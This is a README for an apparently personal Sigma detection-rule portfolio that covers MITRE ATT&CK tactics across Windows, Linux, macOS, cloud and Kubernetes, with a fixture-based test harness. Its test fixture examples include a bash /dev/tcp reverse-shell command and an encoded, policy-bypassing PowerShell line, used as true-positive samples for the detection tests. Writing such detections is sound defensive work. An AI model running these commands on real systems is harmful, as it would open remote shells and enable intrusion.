# Blue Team Sigma Rules Pack

> **Author:** Rizko Febri Rachmayadi  
> **Status:** Active Development  
> **63 Sigma Rules** | **13/12 MITRE ATT&CK Tactic Coverage** | **56+ Unique Techniques**  
> **Cross-platform: Windows, Linux, macOS, AWS, Azure, GCP, Kubernetes**

---

## Objective

A self-contained detection engineering portfolio demonstrating:
- **Sigma rule authoring** across the full MITRE ATT&CK kill chain
- **Cross-platform coverage**: Windows, Linux, macOS, AWS, Azure, GCP
- **Unit testing framework** for detection logic validation
- **CI/CD pipeline** (GitHub Actions) for syntax validation, compilation, and coverage reporting
- **Detection engineering methodology**: threat-informed, tested, documented

---

## Project Structure

```
blue-team-sigma-rules/
├── .github/workflows/
│   └── sigma-test.yml          # GitHub Actions CI pipeline
├── rules/                      # 63 Sigma detection rules
│   ├── initial-access/         # 4 rules (T1204, T1547)
│   ├── execution/              # 10 rules (T1059.001, T1059.004, T1047, T1218, T1105, T1197)
│   ├── persistence/            # 10 rules (T1053, T1543, T1546, T1547, T1098, T1078, T1098.002)
│   │   ├── (+ AWS IAM, Azure Guest Role, Azure Admin Consent, GCP IAM)
│   ├── privilege-escalation/   # 5 rules (T1068, T1548, T1053, T1611)
│   ├── defense-evasion/        # 15 rules (T1218, T1027, T1197, T1070, T1562, T1556)
│   │   ├── (+ AWS CloudTrail, AWS SG Open, Azure MFA Disabled)
│   ├── credential-access/      # 8 rules (T1003, T1557, T1558, T1078, T1552)
│   │   ├── (+ GCP Service Account Key, K8s Secret Enum)
│   ├── discovery/              # 4 rules (T1087, T1057, T1530)
│   │   ├── (+ AWS S3 Public, GCP Bucket Public)
│   ├── lateral-movement/       # 4 rules (T1047, T1021, T1550)
│   ├── kubernetes/             # 8 rules (NEW — K8s runtime detection)
│   │   ├── crypto-mining-pod, privileged-container, kubectl-exec-pod,
│   │   ├── cluster-admin-binding, malicious-admission-webhook,
│   │   ├── secret-bulk-enumeration, hostpath-volume-mount, malicious-cronjob
│   ├── collection/             # 2 rules (T1119, T1560)
│   ├── command-and-control/    # 2 rules (T1071, T1055)
│   ├── exfiltration/           # 3 rules (T1048)
│   └── impact/                 # 1 rule (T1490)
├── tests/
│   ├── test_harness/
│   │   └── matcher.py           # Sigma detection logic evaluator
│   ├── test_rules.py            # 387 syntax/coverage tests
│   ├── test_detection.py        # Detection-as-Code: TP/TN log fixtures
│   └── fixtures/                # True-positive & true-negative log samples
│       ├── windows/
│       ├── linux/
│       ├── aws/
│       ├── azure/
│       └── gcp/
├── build/                       # Auto-generated artifacts
│   └── coverage-layer.json      # ATT&CK Navigator heatmap
├── scripts/
│   ├── check_mitre_coverage.py # Coverage analysis
│   ├── validate_mitre_tags.py  # Tag validation
│   └── generate_coverage_report.py
├── .yamllint.yml
└── README.md
```

---

## MITRE ATT&CK Coverage Heatmap

| Tactic | Rules | Severity Spread | Key Techniques |
|--------|-------|-----------------|----------------|
| **Initial Access** | 4 | HIGH(3), MEDIUM(1) | T1204.002, T1547.009 |
| **Execution** | 10 | HIGH(6), MEDIUM(4) | T1059.001, T1059.004, T1047, T1218.003 |
| **Persistence** | 10 | HIGH(9), MEDIUM(1) | T1053.005, T1543.003, T1543.002, T1543.001, T1546.003, T1547.001, T1098, T1098.002, T1078.004 |
| **Privilege Escalation** | 5 | CRITICAL(1), HIGH(3), MEDIUM(1) | T1068, T1548.002, T1548.003, T1098, T1078.004 |
| **Defense Evasion** | 15 | HIGH(10), MEDIUM(5) | T1218(.003/.005/.010/.011), T1027, T1070.004, T1562.007, T1562.008, T1556.006 |
| **Credential Access** | 7 | CRITICAL(3), HIGH(3), MEDIUM(1) | T1003(.001/.002/.003/.008), T1557.001, T1558.003, T1078.004 |
| **Discovery** | 4 | HIGH(2), MEDIUM(1), LOW(1) | T1087.002, T1057, T1530 |
| **Lateral Movement** | 4 | HIGH(2), MEDIUM(2) | T1047, T1021.003, T1550.002 |
| **Collection** | 2 | MEDIUM(2) | T1119, T1560, T1560.001 |
| **Command & Control** | 2 | HIGH(1), MEDIUM(1) | T1071.004, T1055 |
| **Exfiltration** | 3 | MEDIUM(3) | T1048, T1048.001 |
| **Impact** | 1 | CRITICAL(1) | T1490 |

---

## Highlighted Rules

### Critical Severity (6 rules)

| Rule | Platform | Technique | Description |
|------|----------|-----------|-------------|
| **LSASS Memory Dump** | Windows | T1003.001 | Detects LSASS credential dumping via comsvcs.dll, procdump, sqldumper |
| **SAM Registry Dump** | Windows | T1003.002 | Detects SAM/SYSTEM/SECURITY hive export via reg.exe |
| **NTDS.dit Extraction** | Windows | T1003.003 | Detects Active Directory database extraction via VSSAdmin or NinjaCopy |
| **Shadow File Access** | Linux | T1003.008 | Detects /etc/shadow, /etc/passwd- access on Linux systems |
| **GCP IAM Policy Change** | GCP | T1098 | Primitive role grant, org admin changes to IAM policies |
| **Volume Shadow Copy Deletion** | Windows | T1490 | Detects VSS deletion — ransomware precursor |

### Cross-Platform Coverage (18 new rules)

### Kubernetes Runtime Detection (8 rules — NEW)

K8s API server audit log detection rules for container runtime threats:

| Rule | MITRE | Description |
|------|-------|-------------|
| **Crypto-mining Pod** | T1204.002 | Mining images (xmrig, lolminer, nbminer) + stratum pool connections |
| **Privileged Container** | T1611 | Pod with `privileged`, `hostPID`, or `hostNetwork` for escape |
| **Kubectl Exec Into Pod** | T1609 | API audit `pods/exec` with shell commands |
| **Cluster-Admin Binding** | T1098 | ClusterRoleBinding granting cluster-admin / system:masters |
| **Malicious Webhook** | T1543.001 | External webhook registration (HTTP, failure Ignore) |
| **Secret Bulk Enumeration** | T1552.007 | Bulk get/list on secrets across namespaces |
| **HostPath Volume Mount** | T1611 | Docker socket, host filesystem, /proc, device mounts |
| **Suspicious CronJob** | T1053.007 | Public images, aggressive schedules, non-standard namespaces |

### Cross-Platform Coverage (18 rules)

| Rule | Platform | Technique | Description |
|------|----------|-----------|-------------|
| **Unix Shell Execution** | Linux | T1059.004 | Reverse shell, pipe-to-shell, encoded commands |
| **macOS Shell Execution** | macOS | T1059.004/007 | osascript abuse, curl\|sh, Gatekeeper bypass |
| **Systemd Service Creation** | Linux | T1543.002 | Malicious systemd unit file persistence |
| **Launch Agent Persistence** | macOS | T1543.001 | LaunchAgent/LaunchDaemon plist abuse |
| **Sudo Abuse** | Linux | T1548.003 | Sudo caching, sudoers modification, SUID abuse |
| **Shadow File Access** | Linux | T1003.008 | Credential dumping via /etc/shadow |
| **Log File Tampering** | Linux | T1070.004 | Log clearing, journalctl flushing, history removal |
| **Data Staging via Archive** | Linux/macOS | T1560.001 | Suspicious tar/zip/7z of sensitive dirs |
| **AWS S3 Public Bucket** | AWS | T1530 | Public bucket ACL/policy changes |
| **AWS IAM Policy Mod** | AWS | T1098 | Admin policy attach, pass role, permissive policy |
| **AWS CloudTrail Disabled** | AWS | T1562.008 | Trail deletion, stop logging, delivery failures |
| **AWS Security Group Open** | AWS | T1562.007 | 0.0.0.0/0 ingress on sensitive ports |
| **Azure Admin Consent Grant** | Azure | T1098.002 | OAuth app admin consent with high-risk scopes |
| **Azure Guest Privileged Role** | Azure | T1078.004 | Guest user elevated to Global Admin |
| **Azure MFA Disabled** | Azure | T1556.006 | MFA removal, CA policy disable, auth method delete |
| **GCP Bucket Public** | GCP | T1530 | allUsers access on Cloud Storage |
| **GCP IAM Policy Change** | GCP | T1098 | Primitive role grant, org IAM changes |
| **GCP Service Account Key** | GCP | T1078.004 | SA key creation/exfiltration |

### Defense Evasion Coverage (12 rules)
The most heavily covered tactic. Rules detect:
- **LOLBins**: MSHTA (T1218.005), Regsvr32 (T1218.010), Rundll32 (T1218.011), CMSTP (T1218.003), Certutil, BITSAdmin
- **Obfuscation**: Caret insertion, string reversal, environment variable expansion (T1027)
- **AMSI Bypass**: PowerShell AMSI initfailed detection
- **Log Clearing**: Linux log file tampering and removal (T1070.004)

### C2 Detection

| Rule | Technique | Indicator |
|------|-----------|-----------|
| **DNS Tunneling** | T1071.004 | High-entropy subdomain queries |
| **Cobalt Strike Pipes** | T1055 | Default named pipe patterns (MSSE-, postex_, beacon_) |

---

## CI/CD Pipeline

The GitHub Actions workflow (`sigma-test.yml`) runs on every push/PR:

1. **Syntax Validation** — Validates YAML for all 63 rules
2. **Schema Validation** — Checks required fields, UUID format, severity levels
3. **Sigmac Compilation** — Compiles rules to Elastic DSL JSON
4. **Unit Tests** — 443 parametrized tests (7 assertion classes per rule)
5. **MITRE Coverage Check** — Ensures all 13 tactics covered
6. **Atomic Link Validation** — Validates all rules have MITRE `related` field
7. **Artifact Publishing** — Compiled rules + coverage report + atomic matrix available for download

---

## Local Usage

```bash
# Run all tests (syntax + coverage + detection)
python3 -m pytest tests/ -v

# Run only detection-as-code tests (TP/TN fixtures)
python3 -m pytest tests/test_detection.py -v

# Run only syntax validation tests
python3 -m pytest tests/test_rules.py -v

# Check MITRE coverage
python3 scripts/check_mitre_coverage.py

# Validate MITRE tags
python3 scripts/validate_mitre_tags.py

# Generate coverage report
python3 scripts/generate_coverage_report.py > coverage-report.md

# Generate ATT&CK Navigator heatmap
mkdir -p build && python3 scripts/generate_navigator_layer.py > build/coverage-layer.json

# Compile to Elastic DSL (requires sigmac)
pip install sigmatools
sigmac -t elastic --format json rules/execution/unix-shell-execution.yml
```

### Viewing the ATT&CK Navigator Heatmap

1. Generate the layer file: `python3 scripts/generate_navigator_layer.py > build/coverage-layer.json`
2. Open https://mitre-attack.github.io/attack-navigator/
3. Click **Open Existing Layer** → Upload `build/coverage-layer.json`
4. The heatmap shows coverage intensity — darker red = more rules per technique

---

## Detection-as-Code Test Harness

Validates Sigma rules against **real log samples**, not just YAML syntax. Each fixture tests whether a rule correctly fires (TP) or stays silent (TN) for a given log event.

### Fixture Format

Each fixture is a JSON file with:

```json
{
  "rule_id": "4d5e6f7a-8b9c-0d1e-2f3a-4b5c6d7e8f9a",
  "expected": true,
  "title": "TP - Encoded PowerShell with bypass",
  "description": "Suspicious PowerShell with -enc, execution policy bypass, hidden window",
  "log": {
    "CommandLine": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgA...",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
  }
}
```

| Field | Description |
|-------|-------------|
| `rule_id` | UUID of the Sigma rule to test (must match exactly) |
| `expected` | `true` = must fire, `false` = must stay silent |
| `title` | Short human-readable test name |
| `log` | Log event fields — matched against rule's `detection` block |

### Adding New Fixtures

```bash
# 1. Create fixture in the right platform directory
touch tests/fixtures/<platform>/<tp|tn>-<rule-description>.json

# 2. Edit fixture with rule UUID, expected outcome, and log fields
# 3. Run detection test
python3 -m pytest tests/test_detection.py -v

# 4. Verify result matches expected
```

**Naming convention:** `{tp|tn}-{rule-short-name}.json`
- `tp-` rules that SHOULD trigger on this log
- `tn-` rules that should NOT trigger

### The Matcher Engine

`tests/test_harness/matcher.py` evaluates Sigma detection logic directly:

- **Modifiers:** `|contains`, `|endswith`, `|startswith`, `|regex`
- **Lists:** `|any` (OR), `|all` (AND) for multi-pattern fields
- **Conditions:** `1 of selection_*`, `all of selection_*`, `selection_a and selection_b`
- **Nested fields:** Dotted-path lookup (`requestParameters.bucketName`)

The matcher is **dependency-free** (pure Python stdlib) — no sigmatools or sigma-cli required to run detection tests.

### Example: Adding a Linux TP fixture

```bash
# 1. Create fixture file
cat > tests/fixtures/linux/tp-bash-revshell.json << 'EOF'
{
  "rule_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "expected": true,
  "title": "TP - Reverse shell via /dev/tcp",
  "log": {
    "CommandLine": "bash -c 'exec 5<>/dev/tcp/192.168.1.100/4444; cat <&5'",
    "Image": "/usr/bin/bash"
  }
}
EOF

# 2. Run detection test
python3 -m pytest tests/test_detection.py::test_rule_against_fixture \
  -k "tp-bash-revshell" -v
```

---

## Design Decisions & Methodology

### Detection Engineering Principles Applied
1. **Threat-Informed**: Every rule maps to a specific MITRE ATT&CK technique and real-world adversary behavior
2. **Layered Detection**: Multiple log sources (process_creation, file_event, file_access, dns_query)
3. **Cross-Platform**: Rules target Windows, Linux, and macOS environments
4. **False Positive Consideration**: Every rule includes `falsepositives` and severity justification
5. **Sigmac-Compatible**: All rules compile with the official `sigmac` toolchain
6. **Test-Driven**: 7 test assertions per rule ensure quality and consistency
7. **Platform-Specific Log Sources**: Rules use appropriate Sigma `logsource` categories per platform (process_creation for Linux auditd, file_event for macOS Endpoint Security)

### Why Sigma?
- **Vendor-agnostic**: Rules compile to Elastic, Splunk, Azure Sentinel, QRadar, etc.
- **Community standard**: Backed by SigmaHQ and 300+ contributors
- **Portable**: Same rule works across SIEM platforms
- **CI-friendly**: YAML format enables automated testing

---

## Limitations & Educational Scope

- **Lab-validated only on public datasets**: These rules have NOT been tested against real production telemetry
- **No tuning**: Real detection engineering requires iterative false-positive tuning
- **Linux rules require auditd**: Linux process_creation detection needs auditd or eBPF-based telemetry collection
- **macOS rules require ESF**: macOS detection requires Endpoint Security Framework or third-party EDR
- **Standalone rules**: No correlation logic, no risk scoring, no SOAR integration
- **Not production-ready**: Intended for portfolio demonstration and educational reference

---

## Future Roadmap

### ✅ Just Delivered (this update)
- [x] **Kubernetes Runtime Detection** — 8 Sigma rules for K8s audit logs: crypto-mining, privileged container, kubectl exec, RBAC abuse, malicious webhook, secret enumeration, hostpath mount, cronjob persistence
- [x] **Emulation Mapping** — `related` field with MITRE ATT&CK technique IDs added to all 63 rules for purple-team validation
- [x] **CI Validation** — `scripts/validate_atomic_links.py` automates `related` field enforcement
- [x] **Atomic Red Team Coverage Matrix** — `build/atomic-matrix.md` auto-generated technique-to-rule mapping
- [x] **TP/TN Detection Fixtures** — 16 K8s fixture files validating detection logic against real log scenarios

### Detection Engineering Maturity
- [x] **Detection-as-Code test harness** — validate each rule against true-positive / true-negative log fixtures (not just syntax), using sigma-cli + backend converters
- [ ] **Rule metadata enrichment** — add measurable `falsepositives`, alert-return `fields`, and `related` rule chaining for production-grade rules

### Coverage & Visibility
- [x] Linux/macOS detection rules (T1059.004, T1543.002, T1548.003, T1003.008, T1070.004, T1543.001, T1560.001)
- [x] **Cloud detection rules** (AWS CloudTrail, Azure Activity Logs, GCP Audit Logs)
- [x] **ATT&CK Navigator Layer JSON export** — visual coverage heatmap
- [ ] **Container / Kubernetes runtime rules** — Falco-style (crypto-mining, container escape, kubectl abuse)

### Operational Realism
- [ ] **Emulation mapping** — link each rule to an Atomic Red Team test ID for purple-team validation
- [ ] **Rule triage / severity scoring model** — risk score = severity × asset criticality × confidence
- [ ] **Sigma → multi-SIEM compilation matrix** — auto-compile to Splunk SPL, Elastic DSL, Sentinel KQL, Chronicle YARA-L

### Analysis & Extras
- [ ] **Coverage gap analysis** — compare against full ATT&CK matrix, generate "missing techniques" report
- [ ] **MITRE D3FEND mapping** — pair each detection with a defensive countermeasure
- [ ] Add correlation rules (multi-event sequences)
- [ ] Performance benchmarking against real event volumes

---

## References

- [Sigma Specification](https://github.com/SigmaHQ/sigma-specification)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [SigmaHQ Rules Repository](https://github.com/SigmaHQ/sigma)
